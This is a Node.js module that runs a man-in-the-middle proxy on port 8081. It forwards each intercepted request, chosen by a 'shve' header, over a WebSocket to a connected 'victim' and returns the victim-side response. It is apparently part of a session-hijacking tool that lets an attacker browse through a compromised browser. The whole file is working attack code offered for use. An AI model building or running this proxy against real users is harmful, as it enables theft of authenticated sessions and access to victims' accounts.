const HttpMitmProxy = require('http-mitm-proxy');
const { startServer: startVictimServer, sendWebSocketRequest } = require('./victimServer');


function startProxyServer() {
  const proxy = new HttpMitmProxy.Proxy();

  proxy.onRequest(async (ctx, callback) => {
    const protocol = ctx.isSSL ? 'https://' : 'http://';
    const fullUrl = `${protocol}${ctx.clientToProxyRequest.headers.host}${ctx.clientToProxyRequest.url}`;
  
    console.log(`[${new Date().toISOString()}] ${ctx.clientToProxyRequest.method} ${fullUrl}`);
  
    const wsId = ctx.clientToProxyRequest.headers.shve;
  
    const response = await sendWebSocketRequest(wsId, ctx.clientToProxyRequest.method, fullUrl, ctx.clientToProxyRequest.postData);
  
    if (response.error) {
      ctx.proxyToClientResponse.writeHead(200, { 'Content-Type': 'text/plain' });
      ctx.proxyToClientResponse.end(response.error);
    } else {
      ctx.proxyToClientResponse.writeHead(200, { 'Content-Type': 'text/html' });
      ctx.proxyToClientResponse.end(response.body);
    }
  
    return callback();
  });

  proxy.listen({ port: 8081, sslCaDir: './certs' }, () => {
    console.log('Proxy listening on port: 8081');
  });
}

module.exports = startProxyServer;